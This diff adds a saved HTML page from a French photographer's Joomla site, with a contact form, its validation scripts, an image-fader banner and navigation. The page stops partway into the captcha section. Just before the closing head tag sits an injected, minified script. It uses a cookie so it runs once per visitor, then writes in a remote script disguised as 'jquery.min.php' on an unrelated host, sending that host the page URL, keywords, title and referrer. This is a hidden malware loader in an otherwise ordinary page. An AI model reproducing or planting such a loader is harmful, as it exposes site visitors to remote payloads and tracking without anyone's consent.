@@ -1,0 +1,826 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr-fr" lang="fr-fr" >
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="robots" content="index, follow" />
+  <meta name="keywords" content="Photographies de Frederic Sonnino" />
+  <meta name="description" content="Photographies de Frederic Sonnino" />
+  <meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
+  <title>Photographies de Frederic Sonnino</title>
+  <link href="/templates/aluma_photography/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+  <link rel="stylesheet" href="http://frederic-sonnino.com/components/com_aicontactsafe/includes/css/aicontactsafe_general.css" type="text/css" />
+  <link rel="stylesheet" href="http://frederic-sonnino.com/media/aicontactsafe/cssprofiles/profile_css_2.css" type="text/css" />
+  <script type="text/javascript" src="/includes/js/joomla.javascript.js"></script>
+  <script type="text/javascript" src="/media/system/js/mootools.js"></script>
+  <script type="text/javascript">
+
+	//<![CDATA[
+	<!--
+	function resetSubmit( pf ) {
+		$('adminForm_'+pf).addEvent('submit', function(e) {
+			new Event(e).stop();
+			this.send({
+				onRequest: function(){ 
+										document.getElementById('adminForm_'+pf).elements['task'].value = 'ajaxform'; 
+										document.getElementById('adminForm_'+pf).elements['use_ajax'].value = '1';
+										$('aiContactSafeSend_loading_'+pf).setHTML('&nbsp;&nbsp;Veuillez patienter...&nbsp;<img id="imgLoading" border="0" src="http://frederic-sonnino.com/components/com_aicontactsafe/includes/images/load.gif" />&nbsp;&nbsp;');
+										document.getElementById('adminForm_'+pf).elements['aiContactSafeSendButton'].disabled = true;
+									},
+				onComplete: function() { 
+										$('displayAiContactSafeForm_'+pf).setHTML( this.response.text );
+										changeCaptcha(pf,0); 
+										document.getElementById('adminForm_'+pf).elements['aiContactSafeSendButton'].removeAttribute('disabled');
+										if (document.getElementById('adminForm_'+pf).elements['ajax_return_to']) {
+											var ajax_return_to = document.getElementById('adminForm_'+pf).elements['ajax_return_to'].value;
+											if (ajax_return_to.length > 0) {
+												window.location = ajax_return_to;
+											}
+										} else {
+											if (document.getElementById('adminForm_'+pf).elements['ajax_message_sent']) {
+												var return_to = document.getElementById('adminForm_'+pf).elements['return_to'].value;
+												return_to = return_to.replace('&#38;', '&');
+												var current_url = document.getElementById('adminForm_'+pf).elements['current_url'].value;
+												current_url = current_url.replace('&#38;', '&');
+												if (return_to.length > 0 && return_to != current_url) {													
+													window.location = return_to;
+												}
+											}
+										}
+										$('aiContactSafeSend_loading_'+pf).setHTML('&nbsp;');
+										setupCalendars(pf);
+									}
+			});
+		});
+	}
+	function checkEditboxLimit( pf, editbox_id, chars_limit ){
+		if (document.getElementById('adminForm_'+pf).elements[editbox_id]) {
+			if (document.getElementById('adminForm_'+pf).elements[editbox_id].value.length > chars_limit) {
+				alert('Nombre maximum de caractères atteint !');
+				document.getElementById('adminForm_'+pf).elements[editbox_id].value = document.getElementById('adminForm_'+pf).elements[editbox_id].value.substring(0,chars_limit);
+			} else {
+				if (document.getElementById('adminForm_'+pf).elements['countdown_'+editbox_id]) {
+					document.getElementById('adminForm_'+pf).elements['countdown_'+editbox_id].value = chars_limit - document.getElementById('adminForm_'+pf).elements[editbox_id].value.length;
+				}
+			}
+		}
+	}
+	function changeCaptcha( pf, modifyFocus ) {
+		if (document.getElementById('div_captcha_img_'+pf)) {
+			var set_rand = Math.floor(Math.random()*10000000001);
+			var r_id = document.getElementById('adminForm_'+pf).elements['r_id'].value;
+			var captcha_file = 'http://frederic-sonnino.com/index.php?option=com_aicontactsafe&sTask=captcha&task=captcha&pf='+pf+'&r_id='+r_id+'&lang=&format=raw&set_rand='+set_rand;
+			if (window.ie6) {
+				var url = 'http://frederic-sonnino.com/index.php?option=com_aicontactsafe&sTask=captcha&task=newCaptcha&pf='+pf+'&r_id='+r_id+'&lang=&format=raw&set_rand='+set_rand;
+				new Ajax(url, {
+					method: 'get',
+					update: $('div_captcha_img_'+pf),
+					onRequest: function(){ $('div_captcha_img_'+pf).setHTML('Veuillez patienter...'); }
+				}).request();
+			} else {
+				$('div_captcha_img_'+pf).setHTML( '<img src="'+captcha_file+'" alt="&nbsp;" id="captcha" border="0" />' );
+			}
+			if (modifyFocus && document.getElementById('captcha-code')) {
+				document.getElementById('captcha-code').focus();
+			}
+		}
+		if (document.getElementById('captcha-code')) {
+			$('captcha-code').value = '';
+		} else if (document.getElementById('captcha_code')) {
+			$('captcha_code').value = '';
+		} else if (document.getElementById('mathguard_answer')) {
+			$('mathguard_answer').value = '';
+		} else if (document.getElementById('recaptcha_response_field')) {
+			$('recaptcha_response_field').value = '';
+		}
+	}
+	function setDate( pf, newDate, idDate ) {
+		if (document.getElementById('adminForm_'+pf).elements['day_'+idDate]) {
+			document.getElementById('adminForm_'+pf).elements['day_'+idDate].value = newDate.substr(8,2);
+		}
+		if (document.getElementById('adminForm_'+pf).elements['month_'+idDate]) {
+			var selMonth = newDate.substr(5,2);
+			if(selMonth.substr(0,1) == '0') {
+				selMonth = selMonth.substr(1,1);
+			}
+			selMonth = parseInt(selMonth) - 1;
+			document.getElementById('adminForm_'+pf).elements['month_'+idDate].options[selMonth].selected = true;
+		}
+		if (document.getElementById('adminForm_'+pf).elements['year_'+idDate]) {
+			document.getElementById('adminForm_'+pf).elements['year_'+idDate].value = newDate.substr(0,4);
+		}
+	}
+	function daysInFebruary( year ){
+		var days = (((year % 4 == 0) && ( (!(year % 100 == 0)) || (year % 400 == 0))) ? 29 : 28 );
+		return days;
+	}
+	function daysInMonth( month, year ) {
+		var days = 31;
+		switch( true ) {
+			case month == 2 :
+				days = daysInFebruary( year );
+				break;
+			case month == 4 || month == 6 || month == 9 || month == 11 :
+				days = 30;
+				break;
+		}
+	   return days;
+	}
+	function checkDate( pf, idDate ) {
+		var year = 0;
+		var month = 0;
+		var day = 0;
+		if (document.getElementById('adminForm_'+pf).elements['year_'+idDate]) {
+			year = document.getElementById('adminForm_'+pf).elements['year_'+idDate].value;
+		}
+		if (document.getElementById('adminForm_'+pf).elements['month_'+idDate]) {
+			month = document.getElementById('adminForm_'+pf).elements['month_'+idDate].value;
+		}
+		if (document.getElementById('adminForm_'+pf).elements['day_'+idDate]) {
+			day = document.getElementById('adminForm_'+pf).elements['day_'+idDate].value;
+		}
+		if (day > 0 && month > 0 && year > 0) {
+			var days = daysInMonth( month, year );
+			if (day > days) {
+				day = days;
+				document.getElementById('adminForm_'+pf).elements['day_'+idDate].value = days;
+				var error = 'Il n\'y a que %days% jours dans le mois sélectionné.';
+				alert( error.replace( '%days%', days ) );
+			}
+		}
+		if (document.getElementById('adminForm_'+pf).elements[idDate]) {
+			document.getElementById('adminForm_'+pf).elements[idDate].value = year+'-'+month+'-'+day;
+		}
+	}
+	function clickCheckBox( pf, idTag, ckChecked ) {
+		document.getElementById('adminForm_'+pf).elements[idTag].value = ckChecked?1:0;
+	}
+	function hideUploadField(file_field, pf) {
+		$('upload_'+pf+'_file_'+file_field).setStyle('display','none');
+	}
+	function showUploadField(file_field, pf) {
+		$('upload_'+pf+'_file_'+file_field).setStyle('display','inline');
+	}
+	function resetUploadField(file_field, pf) {
+		var var_file_field = "'"+file_field+"'";
+		$('upload_'+pf+'_file_'+file_field).setHTML('<input type="file" name="'+file_field+'" id="'+file_field+'" onchange="startUploadFile('+var_file_field+','+pf+')" />');
+	}
+	function hideFileField(file_field, pf) {
+		$('cancel_upload_'+pf+'_file_'+file_field).setStyle('display','none');
+	}
+	function showFileField(file_field, pf) {
+		$('cancel_upload_'+pf+'_file_'+file_field).setStyle('display','inline');
+	}
+	function hideWaitFileField(file_field, pf) {
+		$('wait_upload_'+pf+'_file_'+file_field).setStyle('display','none');
+	}
+	function showWaitFileField(file_field, pf) {
+		$('wait_upload_'+pf+'_file_'+file_field).setStyle('display','inline');
+	}
+	function cancelUploadFile(file_field, pf) {
+		hideFileField(file_field, pf);
+		deleteUploadedFile(file_field, pf);
+		$('adminForm_'+pf).elements[file_field+'_attachment_name'].value = '';
+		$('adminForm_'+pf).elements[file_field+'_attachment_id'].value = '';
+		resetUploadField(file_field, pf);
+		showUploadField(file_field, pf);
+	}
+	function deleteUploadedFile(file_field, pf) {
+		var file_name = $('adminForm_'+pf).elements[file_field+'_attachment_name'].value;
+		var r_id = document.getElementById('adminForm_'+pf).elements['r_id'].value;
+		var url = 'http://frederic-sonnino.com/index.php?option=com_aicontactsafe&sTask=message&task=deleteUploadedFile&filename='+file_name+'&r_id='+r_id+'&format=raw'
+		new Ajax(url, { method: 'get' }).request();
+	}
+	function startUploadFile(file_field, pf) {
+		var r_id = document.getElementById('adminForm_'+pf).elements['r_id'].value;
+		$('adminForm_'+pf).setProperty('action','index.php?option=com_aicontactsafe&field='+file_field+'&r_id='+r_id+'&format=raw');
+		$('adminForm_'+pf).setProperty('target','iframe_upload_file_'+pf+'_file_'+file_field);
+		$('adminForm_'+pf).elements['task'].value = 'uploadFile';
+		hideUploadField(file_field, pf);
+		hideFileField(file_field, pf);
+		showWaitFileField(file_field, pf);
+		$('adminForm_'+pf).submit();
+		resetUploadField(file_field, pf);
+	}
+	function endUploadFile(pf, file_field, attachment_name, attachment_id, error_type, error_message) {
+		error_type = parseInt(error_type);
+		hideWaitFileField(file_field, pf);
+		switch( error_type ) {
+			case 0 :
+				$('adminForm_'+pf).elements[file_field+'_attachment_name'].value = attachment_name;
+				$('adminForm_'+pf).elements[file_field+'_attachment_id'].value = attachment_id;
+				showFileField(file_field, pf);
+				break;
+			case 1 :
+				alert('Ce type de fichier joint n\'est pas accepté ! ( '+error_message+' ) ');
+				cancelUploadFile(file_field, pf);
+				break;
+			case 2 :
+				alert('Le fichier est trop volumineux ! ( '+error_message+' ) ');
+				cancelUploadFile(file_field, pf);
+				break;
+			case 3 :
+				alert('Autre erreur ! ( '+error_message+' ) ');
+				cancelUploadFile(file_field, pf);
+				break;
+		}
+		resetSendButtonTarget(pf);
+	}
+	function resetSendButtonTarget(pf) {
+		$('adminForm_'+pf).setProperty('action','index.php');
+		$('adminForm_'+pf).setProperty('target','_self');
+		$('adminForm_'+pf).elements['task'].value = 'message';
+	}
+	function setupCalendars(pf) {
+		var calendars_imgs = $$('#adminForm_'+pf+' img.calendar');
+		var countCalendars = calendars_imgs.length;
+		for(var i=0;i<countCalendars;i++) {
+			var imgid = calendars_imgs[i].getProperty('id');
+			if (imgid.substr(imgid.length-4)=='_img') {
+				fieldid = imgid.substr(0,imgid.length-4);
+				Calendar.setup({inputField : fieldid, ifFormat: "%Y-%m-%d", button : imgid, align : "Tl", singleClick : true});
+			}
+		}
+	}
+	//-->
+	//]]>
+
+			//<![CDATA[
+			<!--
+			window.addEvent('load', function() {
+				changeCaptcha(2,0);
+resetSubmit(2);
+
+			});
+			//-->
+			//]]>
+		
+  </script>
+
+
+
+
+
+
+
+<meta http-equiv="Content-Type" content="text/html; _ISO" />
+<meta http-equiv="Content-Style-Type" content="text/css" />
+
+<link rel="stylesheet" href="/templates/system/css/system.css" type="text/css" />
+<link rel="stylesheet" href="/templates/system/css/general.css" type="text/css" />
+
+<link href="/templates/aluma_photography/css/template_css.css" rel="stylesheet" type="text/css" media="screen" />
+
+<link href="/templates/aluma_photography/css/s5_suckerfish.css" rel="stylesheet" type="text/css" media="screen" />
+
+<link href="/templates/aluma_photography/css/editor.css" rel="stylesheet" type="text/css" media="screen" />
+
+		<link rel="stylesheet" href="/templates/aluma_photography/css/lytebox.css" type="text/css" media="screen" />
+		<script type="text/javascript" language="javascript" src="/templates/aluma_photography/js/lytebox.js"></script>
+
+<script language="javascript" type="text/javascript" >var s5_text_menu_1 = 'Go Back Home';</script><script language="javascript" type="text/javascript" >var s5_text_menu_2 = 'Image Gallery';</script><script language="javascript" type="text/javascript" >var s5_text_menu_3 = 'Artist\' statement';</script><script language="javascript" type="text/javascript" >var s5_text_menu_4 = 'Prices';</script><script language="javascript" type="text/javascript" >var s5_text_menu_5 = 'E-mail Me';</script><script language="javascript" type="text/javascript" >var s5_text_menu_6 = 'Get Help Here';</script><script language="javascript" type="text/javascript" >var s5_text_menu_7 = 'Photos For Sale';</script><script language="javascript" type="text/javascript" >var s5_text_menu_8 = 'text8';</script><script language="javascript" type="text/javascript" >var s5_text_menu_9 = 'text9';</script><script language="javascript" type="text/javascript" >var s5_text_menu_10 = 'text10';</script>
+
+
+<style type="text/css">
+
+#s5_logo_holder, #s5_wrapper, #s5_bottom_middle, #s5_row_middle {
+width:948px;
+}
+
+#navv li.active a.active {
+color:#D1D14B;
+}
+
+#navv a:hover {
+color:#D1D14B;
+}
+
+#s5_body {
+background:#000000;
+}
+
+
+</style>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://s512164275.online.de/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'G91825' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
+</head>
+
+<body id="s5_body">
+
+		
+	<div id="s5_top_grad"></div>
+	
+	<div id="s5_wrapper">
+		<div id="s5_logo_holder">
+			<div id="s5_logo"></div>
+			<div id="s5_cpanel">
+				
+			</div>
+	</div>
+			<div class="moduletable">
+					
+
+
+
+
+
+
+<div style="z-index:0;position: relative; overflow: hidden; height: 125px">
+
+<div id="s5_iacf_outer" style="z-index:1;position: relative; max-height:125px; max-width:950px; overflow:hidden; background:#">
+
+<script type="text/javascript">
+var s5_iacf_inc = 15;
+</script>
+
+
+<div id="picture1_s5_iacf" style="padding:0px; display:none; height:125px; opacity:.0;  width:950px; overflow:hidden; background-image: url(/images/stories/fader/landscape1.jpg); background-repeat: no-repeat">
+
+<img alt="" style="border:none" id="picture1_blank_s5_iacf" src="/modules/mod_s5_image_and_content_fader/blank.gif" height="125px" width="950px"></img>
+
+
+<div id="picture1text_bg_s5_iacf" style="z-index:1;position: relative; opacity:0.25;  background:#CCCCCC">
+</div>
+
+<div id="picture1text_s5_iacf" style="z-index:1;height:auto; position: relative; padding:12px; color:#000000; font-weight:bold; font-size:1.1em">
+    
+With all creation I sing praise to the King Of Kings <br/></div>
+
+<script type="text/javascript">
+function set_picture1_loaders() {
+document.getElementById("picture1_blank_s5_iacf").style.height = "125px";
+window.setTimeout('picture1text_load_bg_s5_iacf()',0);
+window.setTimeout('picture1text_effect_big()',1312.5);
+window.setTimeout('picture1text_effect_small()',58687.5);
+}
+
+function picture1text_load_bg_s5_iacf() {
+document.getElementById("picture1text_s5_iacf").style.marginTop = (document.getElementById("picture1text_s5_iacf").offsetHeight * -1) + "px";
+document.getElementById("picture1text_bg_s5_iacf").style.height = document.getElementById("picture1text_s5_iacf").offsetHeight + "px";
+}
+
+function picture1text_effect_big_timer() {
+window.setTimeout('picture1text_effect_big()',10);
+}
+
+function picture1text_effect_big() {
+var s5_outer_iacf = document.getElementById("s5_iacf_outer").offsetHeight;
+if (document.getElementById("picture1_blank_s5_iacf").offsetHeight > s5_outer_iacf - document.getElementById("picture1text_s5_iacf").offsetHeight + 7) {
+document.getElementById("picture1_blank_s5_iacf").style.height = document.getElementById("picture1_blank_s5_iacf").offsetHeight - s5_iacf_inc + "px";
+picture1text_effect_big_timer();
+}
+else {
+document.getElementById("picture1_blank_s5_iacf").style.height = document.getElementById("s5_iacf_outer").offsetHeight - document.getElementById("picture1text_s5_iacf").offsetHeight + "px";
+}
+}
+
+function picture1text_effect_small_timer() {
+window.setTimeout('picture1text_effect_small()',10);
+}
+
+</script>
+
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+
+</div>
+
+<script language="javascript" type="text/javascript" src="/modules/mod_s5_image_and_content_fader/fader.js"></script>
+
+<script type="text/javascript">
+
+
+function picture1_s5_iacf(id_s5_iacf) {
+        document.getElementById(id_s5_iacf).style.display = "block";
+	opacity_s5_iacf(id_s5_iacf, 0, 100, 1750);
+        window.setTimeout('picture1_done_s5_iacf()',60000);
+}
+
+function picture1_done_s5_iacf(){
+	picture1_doneload_s5_iacf('picture1_s5_iacf');
+}
+
+function picture1_doneload_s5_iacf(id_s5_iacf) {
+	opacity_s5_iacf(id_s5_iacf, 100, 0, 1750);
+        window.setTimeout('picture1_next_s5_iacf()',1750);
+}
+
+function picture1_next_s5_iacf(id_s5_iacf) {
+        document.getElementById('picture1_s5_iacf').style.display = "none";
+	if (document.getElementById('picture2_s5_iacf')) {
+		picture2_s5_iacf('picture2_s5_iacf');
+			}
+	else {
+		picture1_s5_iacf('picture1_s5_iacf');
+				set_picture1_loaders();
+			}
+}
+
+
+function picture2_s5_iacf(id_s5_iacf) {
+        document.getElementById(id_s5_iacf).style.display = "block";
+	opacity_s5_iacf(id_s5_iacf, 0, 100, 1750);
+        window.setTimeout('picture2_done_s5_iacf()',60000);
+}
+
+function picture2_done_s5_iacf(){
+	picture2_doneload_s5_iacf('picture2_s5_iacf');
+}
+
+function picture2_doneload_s5_iacf(id_s5_iacf) {
+	opacity_s5_iacf(id_s5_iacf, 100, 0, 1750);
+        window.setTimeout('picture2_next_s5_iacf()',1750);
+}
+
+function picture2_next_s5_iacf(id_s5_iacf) {
+        document.getElementById('picture2_s5_iacf').style.display = "none";
+	if (document.getElementById('picture3_s5_iacf')) {
+		picture3_s5_iacf('picture3_s5_iacf');
+			}
+	else {
+		picture1_s5_iacf('picture1_s5_iacf');
+				set_picture1_loaders();
+			}
+}
+
+
+function picture3_s5_iacf(id_s5_iacf) {
+        document.getElementById(id_s5_iacf).style.display = "block";
+	opacity_s5_iacf(id_s5_iacf, 0, 100, 1750);
+        window.setTimeout('picture3_done_s5_iacf()',60000);
+}
+
+function picture3_done_s5_iacf(){
+	picture3_doneload_s5_iacf('picture3_s5_iacf');
+}
+
+function picture3_doneload_s5_iacf(id_s5_iacf) {
+	opacity_s5_iacf(id_s5_iacf, 100, 0, 1750);
+        window.setTimeout('picture3_next_s5_iacf()',1750);
+}
+
+function picture3_next_s5_iacf(id_s5_iacf) {
+        document.getElementById('picture3_s5_iacf').style.display = "none";
+	if (document.getElementById('picture4_s5_iacf')) {
+		picture4_s5_iacf('picture4_s5_iacf');
+			}
+	else {
+		picture1_s5_iacf('picture1_s5_iacf');
+				set_picture1_loaders();
+			}
+}
+
+
+function picture4_s5_iacf(id_s5_iacf) {
+        document.getElementById(id_s5_iacf).style.display = "block";
+	opacity_s5_iacf(id_s5_iacf, 0, 100, 1750);
+        window.setTimeout('picture4_done_s5_iacf()',60000);
+}
+
+function picture4_done_s5_iacf(){
+	picture4_doneload_s5_iacf('picture4_s5_iacf');
+}
+
+function picture4_doneload_s5_iacf(id_s5_iacf) {
+	opacity_s5_iacf(id_s5_iacf, 100, 0, 1750);
+        window.setTimeout('picture4_next_s5_iacf()',1750);
+}
+
+function picture4_next_s5_iacf(id_s5_iacf) {
+        document.getElementById('picture4_s5_iacf').style.display = "none";
+	if (document.getElementById('picture5_s5_iacf')) {
+		picture5_s5_iacf('picture5_s5_iacf');
+			}
+	else {
+		picture1_s5_iacf('picture1_s5_iacf');
+				set_picture1_loaders();
+			}
+}
+
+
+function picture5_s5_iacf(id_s5_iacf) {
+        document.getElementById(id_s5_iacf).style.display = "block";
+	opacity_s5_iacf(id_s5_iacf, 0, 100, 1750);
+        window.setTimeout('picture5_done_s5_iacf()',60000);
+}
+
+function picture5_done_s5_iacf(){
+	picture5_doneload_s5_iacf('picture5_s5_iacf');
+}
+
+function picture5_doneload_s5_iacf(id_s5_iacf) {
+	opacity_s5_iacf(id_s5_iacf, 100, 0, 1750);
+        window.setTimeout('picture5_next_s5_iacf()',1750);
+}
+
+function picture5_next_s5_iacf(id_s5_iacf) {
+        document.getElementById('picture5_s5_iacf').style.display = "none";
+	if (document.getElementById('picture6_s5_iacf')) {
+		picture6_s5_iacf('picture6_s5_iacf');
+			}
+	else {
+		picture1_s5_iacf('picture1_s5_iacf');
+				set_picture1_loaders();
+			}
+}
+
+
+function picture6_s5_iacf(id_s5_iacf) {
+        document.getElementById(id_s5_iacf).style.display = "block";
+	opacity_s5_iacf(id_s5_iacf, 0, 100, 1750);
+        window.setTimeout('picture6_done_s5_iacf()',60000);
+}
+
+function picture6_done_s5_iacf(){
+	picture6_doneload_s5_iacf('picture6_s5_iacf');
+}
+
+function picture6_doneload_s5_iacf(id_s5_iacf) {
+	opacity_s5_iacf(id_s5_iacf, 100, 0, 1750);
+        window.setTimeout('picture6_next_s5_iacf()',1750);
+}
+
+function picture6_next_s5_iacf(id_s5_iacf) {
+        document.getElementById('picture6_s5_iacf').style.display = "none";
+	if (document.getElementById('picture7_s5_iacf')) {
+		picture7_s5_iacf('picture7_s5_iacf');
+			}
+	else {
+		picture1_s5_iacf('picture1_s5_iacf');
+				set_picture1_loaders();
+			}
+}
+
+
+function picture7_s5_iacf(id_s5_iacf) {
+        document.getElementById(id_s5_iacf).style.display = "block";
+	opacity_s5_iacf(id_s5_iacf, 0, 100, 1750);
+        window.setTimeout('picture7_done_s5_iacf()',60000);
+}
+
+function picture7_done_s5_iacf(){
+	picture7_doneload_s5_iacf('picture7_s5_iacf');
+}
+
+function picture7_doneload_s5_iacf(id_s5_iacf) {
+	opacity_s5_iacf(id_s5_iacf, 100, 0, 1750);
+        window.setTimeout('picture7_next_s5_iacf()',1750);
+}
+
+function picture7_next_s5_iacf(id_s5_iacf) {
+        document.getElementById('picture7_s5_iacf').style.display = "none";
+	if (document.getElementById('picture8_s5_iacf')) {
+		picture8_s5_iacf('picture8_s5_iacf');
+			}
+	else {
+		picture1_s5_iacf('picture1_s5_iacf');
+				set_picture1_loaders();
+			}
+}
+
+
+function picture8_s5_iacf(id_s5_iacf) {
+        document.getElementById(id_s5_iacf).style.display = "block";
+	opacity_s5_iacf(id_s5_iacf, 0, 100, 1750);
+        window.setTimeout('picture8_done_s5_iacf()',60000);
+}
+
+function picture8_done_s5_iacf(){
+	picture8_doneload_s5_iacf('picture8_s5_iacf');
+}
+
+function picture8_doneload_s5_iacf(id_s5_iacf) {
+	opacity_s5_iacf(id_s5_iacf, 100, 0, 1750);
+        window.setTimeout('picture8_next_s5_iacf()',1750);
+}
+
+function picture8_next_s5_iacf(id_s5_iacf) {
+        document.getElementById('picture8_s5_iacf').style.display = "none";
+	if (document.getElementById('picture9_s5_iacf')) {
+		picture9_s5_iacf('picture9_s5_iacf');
+			}
+	else {
+		picture1_s5_iacf('picture1_s5_iacf');
+				set_picture1_loaders();
+			}
+}
+
+
+function picture9_s5_iacf(id_s5_iacf) {
+        document.getElementById(id_s5_iacf).style.display = "block";
+	opacity_s5_iacf(id_s5_iacf, 0, 100, 1750);
+        window.setTimeout('picture9_done_s5_iacf()',60000);
+}
+
+function picture9_done_s5_iacf(){
+	picture9_doneload_s5_iacf('picture9_s5_iacf');
+}
+
+function picture9_doneload_s5_iacf(id_s5_iacf) {
+	opacity_s5_iacf(id_s5_iacf, 100, 0, 1750);
+        window.setTimeout('picture9_next_s5_iacf()',1750);
+}
+
+function picture9_next_s5_iacf(id_s5_iacf) {
+        document.getElementById('picture9_s5_iacf').style.display = "none";
+	if (document.getElementById('picture10_s5_iacf')) {
+		picture10_s5_iacf('picture10_s5_iacf');
+			}
+	else {
+		picture1_s5_iacf('picture1_s5_iacf');
+				set_picture1_loaders();
+			}
+}
+
+
+function picture10_s5_iacf(id_s5_iacf) {
+        document.getElementById(id_s5_iacf).style.display = "block";
+	opacity_s5_iacf(id_s5_iacf, 0, 100, 1750);
+        window.setTimeout('picture10_done_s5_iacf()',60000);
+}
+
+function picture10_done_s5_iacf(){
+	picture10_doneload_s5_iacf('picture10_s5_iacf');
+}
+
+function picture10_doneload_s5_iacf(id_s5_iacf) {
+	opacity_s5_iacf(id_s5_iacf, 100, 0, 1750);
+        window.setTimeout('picture10_next_s5_iacf()',1750);
+}
+
+function picture10_next_s5_iacf(id_s5_iacf) {
+    document.getElementById('picture10_s5_iacf').style.display = "none";
+	picture1_s5_iacf('picture1_s5_iacf');
+		set_picture1_loaders();
+	}
+
+picture1_s5_iacf('picture1_s5_iacf');
+set_picture1_loaders();
+
+</script>		</div>
+	
+	</div>
+	
+	<div id="s5_bottom_wrapper" style="width:1024px">
+	
+		<div id="s5_bottom_tl">
+		
+			<div id="s5_bottom_lm"></div>
+		
+		</div>
+		
+		<div id="s5_bottom_middle">
+		
+			<div id="s5_menu">
+			
+					<div id="navv">
+						<ul onmouseover="check_id()">
+	<li><span class="s5_outer_active"><span style="background-image: url('/images/stories/-1')" class="s5_rs"><a class="active" href="/index.php?option=com_content&amp;view=frontpage&amp;Itemid=1">Home<span class="s5_bottom_text"></span></a></span></span></li>
+	<li><span class="s5_outer_active"><span style="background-image: url('/images/stories/-1')" class="s5_rs"><a class="active" href="/index.php?option=com_joomgallery&amp;Itemid=3">Galerie photos<span class="s5_bottom_text"></span></a></span></span></li>
+	<li><span class="s5_outer_active"><span style="background-image: url('/images/stories/-1')" class="s5_rs"><a class="active" href="/index.php?option=com_content&amp;view=article&amp;id=2&amp;Itemid=2">Qui suis-je ?<span class="s5_bottom_text"></span></a></span></span></li>
+	<li><span class="s5_outer_active"><span style="background-image: url('/images/stories/-1')" class="s5_rs"><a class="active" href="/index.php?option=com_content&amp;view=article&amp;id=3&amp;Itemid=5">Tarifs<span class="s5_bottom_text"></span></a></span></span></li>
+	<li><span class="s5_outer_active"><span style="background-image: url('/images/stories/-1')" class="s5_rs"><a class="active" href="/index.php?option=com_aicontactsafe&amp;view=message&amp;layout=message&amp;pf=2&amp;Itemid=6">Contact<span class="s5_bottom_text"></span></a></span></span></li>
+</ul>						<script type="text/javascript" src="/templates/aluma_photography/js/s5_textmenu.js"></script>																		
+					</div>	
+			
+			</div>
+					
+						
+			<div id="s5_inside_bottom_wrapper">
+			
+									
+					<div id="s5_inside_bottom_middle" style="width:948px">
+					
+						<div id="s5_mainbody_wrapper" style="padding-left:25px; padding-right:25px">
+						
+														
+												
+							
+							
+<div class="aiContactSafe" id="aiContactSafe_mainbody_2">
+<div class="contentpaneopen">
+			<table id="aiContactSafeForm" border="0" cellpadding="0" cellspacing="5">
+				<tr><td valign="top" style="width:500px;" ><div style="font-size: 90%; margin-top: -5px; margin-bottom: -15px;"><span style="font-size: small;">Merci de remplir ce formulaire pour nous contacter</span></div>
+<div style="font-size: 90%; margin-top: -5px; margin-bottom: 15px;"><span style="font-size: small;"> </span></div></td></tr>
+				<tr>
+					<td valign="top" style="width:500px;" >
+						<br clear="all" />
+							<form action="index.php" method="post" id="adminForm_2" name="adminForm_2" enctype="multipart/form-data">		<div id="displayAiContactSafeForm_2">
+				<div class="aiContactSafe" id="aiContactSafe_contact_form">
+				<div class="aiContactSafe" id="aiContactSafe_info"></div>
+										<div class="aiContactSafe_row" id="aiContactSafe_row_aics_nom"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_nom" ><label for="aics_nom" >Nom</label></span>&nbsp;<label class="required_field">*</label></div><div class="aiContactSafe_contact_form_field_right"><input type="text" name="aics_nom" id="aics_nom"  class='nom' value="" /></div></div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_prenom"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_prenom" ><label for="aics_prenom" >Prénom</label></span>&nbsp;<label class="required_field">*</label></div><div class="aiContactSafe_contact_form_field_right"><input type="text" name="aics_prenom" id="aics_prenom"  class='prenom' value="" /></div></div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_email"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_email" ><label for="aics_email" >E-mail</label></span>&nbsp;<label class="required_field">*</label></div><div class="aiContactSafe_contact_form_field_right"><input type="text" name="aics_email" id="aics_email"  class='email' value="" /></div></div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_sujet"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_sujet" ><label for="aics_sujet" >Veuillez préciser le sujet de votre message</label></span>&nbsp;<label class="required_field">*</label></div><div class="aiContactSafe_contact_form_field_right"><input type="text" name="aics_sujet" id="aics_sujet"  class='sujet' value="" /></div></div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_message"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_message" ><label for="aics_message" >Votre message</label></span>&nbsp;<label class="required_field">*</label></div><div class="aiContactSafe_contact_form_field_right"><textarea name="aics_message" id="aics_message" cols="40" rows="10" class='message'></textarea></div></div>
+					</div>
+					</div>
+			<br clear="all" />
+								<div id="div_captcha">
